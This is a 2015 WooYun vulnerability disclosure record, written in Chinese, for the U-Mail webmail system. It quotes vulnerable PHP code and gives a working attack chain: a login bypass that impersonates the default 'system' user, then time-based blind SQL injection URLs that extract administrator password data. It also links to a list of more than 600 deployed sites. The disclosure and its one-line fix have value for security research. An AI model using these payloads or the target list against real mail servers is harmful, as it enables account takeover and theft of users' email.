{"id": 44529, "wybug_id": "wooyun-2015-093233", "wybug_title": "U-Mail邮件系统一处接口漏洞（可sql注入，任意用户登陆，获取管理员密码）", "wybug_corp": "U-Mail", "wybug_author": "Ano_Tom", "wybug_date": "2015-01-22 11:33", "wybug_open_date": "2015-04-22 11:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-22：\t细节向公众公开  简要描述： 用户量这么多的邮件系统，分分钟钟就被getshell是件很令人头疼的事情。 详细说明：  1.邮件系统介绍1）官方下载地址：http://www.comingchina.com/html/downloads/2）版本：最新版V9.8.573）测试环境：Windows Server 2003+IIS6.0+官方默认软件4）使用案例：http://www.comingchina.com/html/case/ OR Google \"Powered by U-Mail\"漏洞代码 附600多url下载 链接: http://pan.baidu.com/s/1nQRzo 密码: ld5k/fast/oab/module/operates.php\nif ( ACTION == \"save-to-pab\" ){\t\tinclude_once( LIB_PATH.\"PAB.php\" );\t\t$PAB = PAB::getinstance( );\t\t$maillist_id = trim( $_GET['maillist'] );\t\tif ( $maillist_id )\t\t{\t\t\t\t$member_all = $Maillist->getMemberByMaillistID( $maillist_id, \"Mailbox,FullName\", 0 );\t\t\t\tif ( !$member_all )\t\t\t\t{\t\t\t\t\t\tdump_json( array( \"status\" => TRUE, \"message\" => \"\" ) );\t\t\t\t}\t\t\t\tforeach ( $member_all as $member )\t\t\t\t{\t\t\t\t\t\tif ( !$PAB->getContactByMail( $user_id, $member['Mailbox'], \"contact_id\", 0 ) )\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$data = array(\t\t\t\t\t\t\t\t\t\t\"user_id\" => $user_id,\t\t\t\t\t\t\t\t\t\t\"fullname\" => $member['FullName'],\t\t\t\t\t\t\t\t\t\t\"pref_email\" => $member['Mailbox'],\t\t\t\t\t\t\t\t\t\t\"updated\" => date( \"Y-m-d H:i:s\" )\t\t\t\t\t\t\t\t);\t\t\t\t\t\t\t\t$res = $PAB->add_contact( $data, 0 );\t\t\t\t\t\t\t\tif ( !$res )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\tdump_json( array( \"status\" => FALSE, \"message\" => \"添加联系人时发生错误，添加失败！\" ) );\t\t\t\t\t\t\t\t}\t\t\t\t\t\t}\t\t\t\t}\t\t}\t\telse\t\t{//不提交maillist，进入\t\t\t\t$user_ids = trim( $_GET['userlist'] );\t\t\t\tif ( !$user_ids )\t\t\t\t{\t\t\t\t\t\tdump_msg( \"param_error\", \"参数错误！\" );\t\t\t\t}\t\t\t\t$where = \"t1.UserID IN (\".$user_ids.\")\";无单引号，产生注入\t\t\t\t$arr_tmp = $Mailbox->getMailboxInfo( $domain_id, $where, \"\", \"\", \"\", \"\", 0 );\t\t\t\t$user_all = $arr_tmp['data'];\t\t\t\tif ( !$user_all )\t\t\t\t{\t\t\t\t\t\tdump_json( array( \"status\" => TRUE, \"message\" => \"\" ) );\t\t\t\t}\n函数文件/admin/lib/Mailbox.php代码\npublic function getMailboxInfo( $_obfuscate_AkPSczrCIu40, $_obfuscate_IRFhnYwÿ = \"\", $_obfuscate_AedrEgÿÿ = \"\", $_obfuscate_xvYeh9Iÿ = \"\", $_obfuscate_tUi30UB0e88ÿ = \"\", $_obfuscate_u5srL4rM3PZJLvpPhQÿÿ = FALSE, $_obfuscate_ySeUHBwÿ = FALSE )\t\t{\t\t\t\t$_obfuscate_AkPSczrCIu40 = intval( $_obfuscate_AkPSczrCIu40 );\t\t\t\t$_obfuscate_zbtFQY92OYenSG9u = \"t1.DomainID='\".$_obfuscate_AkPSczrCIu40.\"' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0\";\t\t\t\tif ( $_obfuscate_IRFhnYwÿ )\t\t\t\t{\t\t\t\t\t\t$_obfuscate_zbtFQY92OYenSG9u .= \" AND \".$_obfuscate_IRFhnYwÿ;//直接拼接where语句，并最终执行sql语句\t\t\t\t}\t\t\t\tif ( $_obfuscate_xvYeh9Iÿ )\t\t\t\t{\t\t\t\t\t\tif ( $_obfuscate_AedrEgÿÿ )\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$_obfuscate_mV9HBLYÿ = $_obfuscate_AedrEgÿÿ * $_obfuscate_xvYeh9Iÿ - $_obfuscate_xvYeh9Iÿ;\t\t\t\t\t\t}\t\t\t\t\t\tif ( $_obfuscate_mV9HBLYÿ )\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$_obfuscate_UFlHiZJcJu6DQBFE = \"LIMIT \".$_obfuscate_mV9HBLYÿ.\",\".$_obfuscate_xvYeh9Iÿ;\t\t\t\t\t\t}\t\t\t\t\t\telse\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$_obfuscate_UFlHiZJcJu6DQBFE = \"LIMIT \".$_obfuscate_xvYeh9Iÿ;\t\t\t\t\t\t}\t\t\t\t}\t\t\t\tif ( $_obfuscate_tUi30UB0e88ÿ )\t\t\t\t{\t\t\t\t\t\t$_obfuscate_5e2O0TiivW7ec4cÿ = \"ORDER BY \".$_obfuscate_tUi30UB0e88ÿ;\t\t\t\t\t\tif ( $_obfuscate_u5srL4rM3PZJLvpPhQÿÿ )\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$_obfuscate_5e2O0TiivW7ec4cÿ .= \" DESC\";\t\t\t\t\t\t}\t\t\t\t\t\t$_obfuscate_5e2O0TiivW7ec4cÿ .= \",t1.FullName ASC\";\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t\t$_obfuscate_5e2O0TiivW7ec4cÿ = \"ORDER BY t1.OrderNo DESC,t1.Mailbox ASC\";\t\t\t\t}\t\t\t\t$_obfuscate_mGXfswsMZQÿÿ = \"SELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\\r\\n\\t\\t\\t\\tFROM \".$this->get_table_name( \"mailbox\" ).\" as t1, \".$this->get_table_name( \"info\" ).\" as t2\\r\\n\\t\\t\\t\\tWHERE \".$_obfuscate_zbtFQY92OYenSG9u.\"\\r\\n\\t\\t\\t\\t\".$_obfuscate_5e2O0TiivW7ec4cÿ;\t\t\t\t$_obfuscate_YdwIclUMQÿÿ = $_obfuscate_mGXfswsMZQÿÿ.\" \".$_obfuscate_UFlHiZJcJu6DQBFE;\t\t\t\tif ( $_obfuscate_ySeUHBwÿ )\t\t\t\t{\t\t\t\t\t\tdump( $_obfuscate_YdwIclUMQÿÿ );\t\t\t\t}\t\t\t\t$_obfuscate_MbMfEtWGUpEscGl = $this->db_count( $_obfuscate_mGXfswsMZQÿÿ );\t\t\t\tunset( $_obfuscate_1LzzW8sGEkLaizkÿ );\t\t\t\t$_obfuscate_6RYLWQÿÿ = $this->db_select( $_obfuscate_YdwIclUMQÿÿ, \"more\" );\t\t\t\treturn array(\t\t\t\t\t\t\"count\" => $_obfuscate_MbMfEtWGUpEscGl,\t\t\t\t\t\t\"data\" => $_obfuscate_6RYLWQÿÿ\t\t\t\t);\t\t}\n无需登录的原因是，邮箱系统有system的默认用户，且该文件并未验证用户的密码，只要提交用户名，即认为登录成功，并可进行一系列操作。首先执行http://mail.fuck.com/webmail/fast/index.php?module=operate&action=login 向其post如下数据mailbox=system@fuck.com&link=? 如图，登录成功，虽然页面不显示，但所有的函数都可以执行\n\n然后执行，http://mail.fuck.com/webmail/fast/oab/index.php?module=operate&action=save-to-pab&userlist=if(ascii(substr((select password from userlist where FullName=0x73797374656D),1,1))=97,sleep(5),1)执行的sql语句为\n150121 20:11:25\t 2263 Connect\tumail@localhost on \t\t 2263 Query\tSET NAMES 'UTF8'\t\t 2263 Init DB\tumail\t\t 2263 Query\tSELECT t1.UserID,t1.Mailbox,t1.FullName,t1.EnglishName,t2.*\t\t\t\tFROM userlist as t1, mailuserinfo as t2\t\t\t\tWHERE t1.DomainID='1' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0 AND t1.UserID IN (if(ascii(substr((select password from userlist where FullName=0x73797374656D),1,1))=97,sleep(5),1))\t\t\t\tORDER BY t1.OrderNo DESC,t1.Mailbox ASC\n\n\n查看响应\n\n然后读取管理员密码，即可对所有用户及邮件操作，管理表为web_usr \n\nexp中不能引入单引号，所以读取admin 和administrator的exp分别为http://mail.fuck.com/webmail/fast/oab/index.php?module=operate&action=save-to-pab&userlist=if(ascii(substr((select password from web_usr where role_code=1),1,1))=97,sleep(5),1)http://mail.fuck.com/webmail/fast/oab/index.php?module=operate&action=save-to-pab&userlist=if(ascii(substr((select password from userlist where role_code=2),1,1))=97,sleep(5),1)   漏洞证明：  如上   修复方案：  用上你们的id_list_filter()函数就ok了   版权声明：转载请注明来源 Ano_Tom@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-01-26 15:24 厂商回复： CNVD确认所述情况，已经由CNVD通过以往建立的处置渠道向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-22 11:38 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  关注下    \n     2015-01-22 11:39 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:40        | Talk is cheap.:)\t\t \n  @子非海绵宝宝 关注下那个无需登录，可批量getshell的，哈哈    \n     2015-01-22 11:44 |    \t\tcnssr4bb1t \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 优美。)\t\t \n  已经被你玩坏了    \n     2015-01-22 11:49 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:40        | Talk is cheap.:)\t\t \n  @cnssr4bb1t 厂商估计哭了。。。    \n     2015-01-22 13:02 |    \t\tbobbi \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:6        | 人生真是寂寞如雪)\t\t \n  asd    \n     2015-01-22 14:02 |    \t\tBlunber \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:13        )\t\t \n  @Ano_Tom 是soap注入吗？    \n     2015-01-22 14:06 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:40        | Talk is cheap.:)\t\t \n  @Blunber 不是，就普通的注入，管理改名了。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}